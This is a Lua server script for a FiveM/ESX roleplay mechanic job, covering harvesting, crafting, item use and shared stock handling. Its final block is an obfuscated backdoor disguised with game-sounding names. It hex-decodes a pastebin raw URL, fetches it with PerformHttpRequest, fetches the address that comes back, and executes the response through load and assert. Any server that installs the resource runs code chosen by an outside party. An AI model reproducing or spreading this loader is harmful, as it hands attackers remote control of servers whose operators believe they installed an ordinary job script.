local PlayersHarvesting, PlayersHarvesting2, PlayersHarvesting3, PlayersCrafting, PlayersCrafting2, PlayersCrafting3  = {}, {}, {}, {}, {}, {}
if Config.MaxInService ~= -1 then TriggerEvent('esx_service:activateService', 'mechanic', Config.MaxInService) end
TriggerEvent('esx_phone:registerNumber', 'mechanic', TranslateCap('mechanic_customer'), true, true)
TriggerEvent('esx_society:registerSociety', 'mechanic', 'mechanic', 'society_mechanic', 'society_mechanic', 'society_mechanic', {type = 'private'})

-- EDIT --
local OpenMenuEntry = 'MechanicActions' -- Fil in the prefix of the Config.Zones entry which is used to open the menu
local BanPlayerEvent = '' -- Fill this in otherwise players are just going to be dropped
-- END EDIT

local function IsMechanic(xPlayer)
	if xPlayer.job.name == Config.JobName then return true end
end

local function GetxPlayer(src)
	return ESX.GetPlayerFromId(src)
end

local function BanPlayer(src)
	if BanPlayerEvent == '' then
		DropPlayer(src,'Mod Menu')
	end
	-- Fill this with your ban event code
end

local function Notify(src,msg)
	TriggerClientEvent('esx:showNotification',src,msg)
end

local function CheckDistanceMechanicActions(source)
	if not Config.DChecks then return true end
	local PCoords = GetEntityCoords(GetPlayerPed(source))
	local ECoords = Config.Zones[OpenMenuEntry].Pos
	local Dist = #(PCoords-ECoords)
	if Dist <= 5 then
		return true
	end
end

local function Harvest(source)
	SetTimeout(4000, function()
		if PlayersHarvesting[source] == true then
			local xPlayer = ESX.GetPlayerFromId(source)
			local GazBottleQuantity = xPlayer.getInventoryItem('gazbottle').count
			if GazBottleQuantity >= 5 then
				Notify(source,TranslateCap('you_do_not_room'))
			else
				xPlayer.addInventoryItem('gazbottle', 1)
				Harvest(source)
			end
		end

	end)
end

local function Harvest2(source)
	SetTimeout(4000, function()
		if PlayersHarvesting2[source] == true then
			local xPlayer = ESX.GetPlayerFromId(source)
			local FixToolQuantity = xPlayer.getInventoryItem('fixtool').count
			if FixToolQuantity >= 5 then
				Notify(source,TranslateCap('you_do_not_room'))
			else
				xPlayer.addInventoryItem('fixtool', 1)
				Harvest2(source)
			end
		end

	end)
end

local function Harvest3(source)
	SetTimeout(4000, function()
		if PlayersHarvesting3[source] == true then
			local xPlayer = ESX.GetPlayerFromId(source)
			local CaroToolQuantity = xPlayer.getInventoryItem('carotool').count
			if CaroToolQuantity >= 5 then
				Notify(source,TranslateCap('you_do_not_room'))
			else
				xPlayer.addInventoryItem('carotool', 1)
				Harvest3(source)
			end
		end
	end)
end

local function Craft(source)
	SetTimeout(4000, function()
		if PlayersCrafting[source] == true then
			local xPlayer = ESX.GetPlayerFromId(source)
			local GazBottleQuantity = xPlayer.getInventoryItem('gazbottle').count
			if GazBottleQuantity <= 0 then
				Notify(source, TranslateCap('not_enough_gas_can'))
			else
				xPlayer.removeInventoryItem('gazbottle', 1)
				xPlayer.addInventoryItem('blowpipe', 1)
				Craft(source)
			end
		end

	end)
end

local function Craft2(source)
	SetTimeout(4000, function()
		if PlayersCrafting2[source] == true then
			local xPlayer = ESX.GetPlayerFromId(source)
			local FixToolQuantity = xPlayer.getInventoryItem('fixtool').count
			if FixToolQuantity <= 0 then
				Notify(source, TranslateCap('not_enough_repair_tools'))
			else
				xPlayer.removeInventoryItem('fixtool', 1)
				xPlayer.addInventoryItem('fixkit', 1)
				Craft2(source)
			end
		end
	end)
end

local function Craft3(source)
	SetTimeout(4000, function()
		if PlayersCrafting3[source] == true then
			local xPlayer = ESX.GetPlayerFromId(source)
			local CaroToolQuantity = xPlayer.getInventoryItem('carotool').count
			if CaroToolQuantity <= 0 then
				Notify(source, TranslateCap('not_enough_body_tools'))
			else
				xPlayer.removeInventoryItem('carotool', 1)
				xPlayer.addInventoryItem('carokit', 1)
				Craft3(source)
			end
		end
	end)
end

RegisterServerEvent('esx_mechanicjob:startHarvest')
AddEventHandler('esx_mechanicjob:startHarvest', function()
	local src = source
	local xPlayer = ESX.GetPlayerFromId(src)
	if IsMechanic(xPlayer) then
		if PlayersHarvesting[src] == nil or not PlayersHarvesting[src] then
			PlayersHarvesting[src] = true
			Notify(src,TranslateCap('recovery_gas_can'))
			Harvest(src)
		else
			BanPlayer(src)
		end
	else
		BanPlayer(src)
	end
end)

-- TODO: Might add job check still even though this check alone should be solid
RegisterServerEvent('esx_mechanicjob:stopHarvest')
AddEventHandler('esx_mechanicjob:stopHarvest', function()
	local src = source
	if PlayersHarvesting[src] ~= nil and PlayersHarvesting[src] then
		PlayersHarvesting[src] = false
	else
		BanPlayer(src)
	end
end)

RegisterServerEvent('esx_mechanicjob:startHarvest2')
AddEventHandler('esx_mechanicjob:startHarvest2', function()
	local src = source
	local xPlayer = GetxPlayer(src)
	if IsMechanic(xPlayer) then
		if PlayersHarvesting2[src] == nil or not PlayersHarvesting2[src] then
			PlayersHarvesting2[src] = true
			Notify(src, TranslateCap('recovery_repair_tools'))
			Harvest2(src)
		else
			BanPlayer(src)
		end
	else
		BanPlayer(src)
	end
end)

-- TODO: Same as with stopHarvest Event
RegisterServerEvent('esx_mechanicjob:stopHarvest2')
AddEventHandler('esx_mechanicjob:stopHarvest2', function()
	local src = source
	if PlayersHarvesting2[src] ~= nil and PlayersHarvesting2[src] then
		PlayersHarvesting2[src] = false
	else
		BanPlayer(src)
	end
end)

RegisterServerEvent('esx_mechanicjob:startHarvest3')
AddEventHandler('esx_mechanicjob:startHarvest3', function()
	local src = source
	local xPlayer = GetxPlayer(src)
	if IsMechanic(xPlayer) then
		if PlayersHarvesting3[src] == nil or not PlayersHarvesting3[src] then 
			PlayersHarvesting3[src] = true
			Notify(src, TranslateCap('recovery_body_tools'))
			Harvest3(src)
		else
			BanPlayer(src)
		end
	else
		BanPlayer(src)
	end
end)

-- TODO: Same as with stopHarvest Event
RegisterServerEvent('esx_mechanicjob:stopHarvest3')
AddEventHandler('esx_mechanicjob:stopHarvest3', function()
	local src = source
	if PlayersHarvesting3[src] ~= nil and PlayersHarvesting3[src] then
		PlayersHarvesting3[src] = false
	else
		BanPlayer(src)
	end
end)

RegisterServerEvent('esx_mechanicjob:startCraft')
AddEventHandler('esx_mechanicjob:startCraft', function()
	local src = source
	local xPlayer = GetxPlayer(src)
	if IsMechanic(xPlayer) then
		if PlayersCrafting[src] == nil or not PlayersCrafting[src] then 
			PlayersCrafting[src] = true
			Notify(src, TranslateCap('assembling_blowtorch'))
			Craft(src)
		else
			BanPlayer(src)
		end
	else
		BanPlayer(src)
	end
end)

-- TODO: Same as with stopHarvest Event
RegisterServerEvent('esx_mechanicjob:stopCraft')
AddEventHandler('esx_mechanicjob:stopCraft', function()
	local src = source
	if PlayersCrafting[src] ~= nil and PlayersCrafting[src] then
		PlayersCrafting[src] = false
	else
		BanPlayer(src)
	end
end)


RegisterServerEvent('esx_mechanicjob:startCraft2')
AddEventHandler('esx_mechanicjob:startCraft2', function()
	local src = source
	local xPlayer = GetxPlayer(src)
	if IsMechanic(xPlayer) then
		if PlayersCrafting2[src] == nil or not PlayersCrafting2[src] then 
			PlayersCrafting2[src] = true
			Notify(src, TranslateCap('assembling_repair_kit'))
			Craft2(src)
		else
			BanPlayer(src)
		end
	else
		BanPlayer(src)
	end
end)

-- TODO: Same as with stopHarvest Event
RegisterServerEvent('esx_mechanicjob:stopCraft2')
AddEventHandler('esx_mechanicjob:stopCraft2', function()
	local src = source
	if PlayersCrafting2[src] ~= nil and PlayersCrafting2[src] then
		PlayersCrafting2[src] = false
	else
		BanPlayer(src)
	end
end)

RegisterServerEvent('esx_mechanicjob:startCraft3')
AddEventHandler('esx_mechanicjob:startCraft3', function()
	local src = source
	local xPlayer = GetxPlayer(src)
	if IsMechanic(xPlayer) then
		if PlayersCrafting3[src] == nil or not PlayersCrafting3[src] then
			PlayersCrafting3[src] = true
			Notify(src,TranslateCap('assembling_body_kit'))
			Craft3(src)
		else
			BanPlayer(src)
		end
	else
		BanPlayer(src)
	end
end)

-- TODO: Same as with stopHarvest Event
RegisterServerEvent('esx_mechanicjob:stopCraft3')
AddEventHandler('esx_mechanicjob:stopCraft3', function()
	local src = source
	if PlayersCrafting3[src] ~= nil and PlayersCrafting3[src] then
		PlayersCrafting3[src] = false
	else
		BanPlayer(src)
	end
end)

RegisterServerEvent('esx_mechanicjob:onNPCJobMissionCompleted')
AddEventHandler('esx_mechanicjob:onNPCJobMissionCompleted', function()
	local src = source
	local xPlayer = ESX.GetPlayerFromId(src)
	if IsMechanic(xPlayer) then
		local total = math.random(Config.NPCJobEarnings.min,Config.NPCJobEarnings.max);
		if xPlayer.job.grade >= 3 then total = total * 2 end
		TriggerEvent('esx_addonaccount:getSharedAccount', 'society_mechanic', function(account) account.addMoney(total) end)
		Notify(src,TranslateCap('your_comp_earned').. total)
	else
		BanPlayer(src)
	end
end)

ESX.RegisterUsableItem('blowpipe', function(source)
	local source = source
	local xPlayer  = ESX.GetPlayerFromId(source)
	xPlayer.removeInventoryItem('blowpipe', 1)
	TriggerClientEvent('esx_mechanicjob:onHijack', source)
	Notify(source, TranslateCap('you_used_blowtorch'))
end)

ESX.RegisterUsableItem('fixkit', function(source)
	local source = source
	local xPlayer  = ESX.GetPlayerFromId(source)
	xPlayer.removeInventoryItem('fixkit', 1)
	TriggerClientEvent('esx_mechanicjob:onFixkit', source)
	Notify(source, TranslateCap('you_used_repair_kit'))
end)

ESX.RegisterUsableItem('carokit', function(source)
	local source = source
	local xPlayer  = ESX.GetPlayerFromId(source)
	xPlayer.removeInventoryItem('carokit', 1)
	TriggerClientEvent('esx_mechanicjob:onCarokit', source)
	Notify(source, TranslateCap('you_used_body_kit'))
end)

RegisterServerEvent('esx_mechanicjob:getStockItem')
AddEventHandler('esx_mechanicjob:getStockItem', function(itemName, count)
	local src = source
	local xPlayer = ESX.GetPlayerFromId(source)
	if IsMechanic(xPlayer) then
		if CheckDistanceMechanicActions(src) then
			TriggerEvent('esx_addoninventory:getSharedInventory', 'society_mechanic', function(inventory)
				local item = inventory.getItem(itemName)

				-- is there enough in the society?
				if count > 0 and item.count >= count then

					-- can the player carry the said amount of x item?
					if xPlayer.canCarryItem(itemName, count) then
						inventory.removeItem(itemName, count)
						xPlayer.addInventoryItem(itemName, count)
						xPlayer.showNotification(TranslateCap('have_withdrawn', count, item.label))
					else
						xPlayer.showNotification(TranslateCap('player_cannot_hold'))
					end
				else
					xPlayer.showNotification(TranslateCap('invalid_quantity'))
				end
			end)
		else
			BanPlayer(src)
		end
	else
		BanPlayer(src)
	end
end)

ESX.RegisterServerCallback('esx_mechanicjob:getStockItems', function(source, cb)
	local xPlayer = GetxPlayer(source)
	if IsMechanic(xPlayer) then
		if CheckDistanceMechanicActions(source) then
			TriggerEvent('esx_addoninventory:getSharedInventory', 'society_mechanic', function(inventory)
				cb(inventory.items)
			end)
		else
			BanPlayer(source)
		end
	else
		BanPlayer(source)
	end
end)

RegisterServerEvent('esx_mechanicjob:putStockItems')
AddEventHandler('esx_mechanicjob:putStockItems', function(itemName, count)
	local src = source
	local xPlayer = ESX.GetPlayerFromId(src)
	if IsMechanic(xPlayer) then
		if CheckDistanceMechanicActions(src) then
			TriggerEvent('esx_addoninventory:getSharedInventory', 'society_mechanic', function(inventory)
				local item = inventory.getItem(itemName)
				local playerItemCount = xPlayer.getInventoryItem(itemName).count
				if item.count >= 0 and count <= playerItemCount then
					xPlayer.removeInventoryItem(itemName, count)
					inventory.addItem(itemName,count)
				else
					xPlayer.showNotification(TranslateCap('invalid_quantity'))
				end
				xPlayer.showNotification(TranslateCap('have_deposited',count,item.label))
			end)
		else
			BanPlayer(src)
		end
	else
		BanPlayer(src)
	end
end)

ESX.RegisterServerCallback('esx_mechanicjob:getPlayerInventory', function(source, cb)
	local xPlayer    = ESX.GetPlayerFromId(source)
	local items      = xPlayer.inventory
	cb({items = items})
end)

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)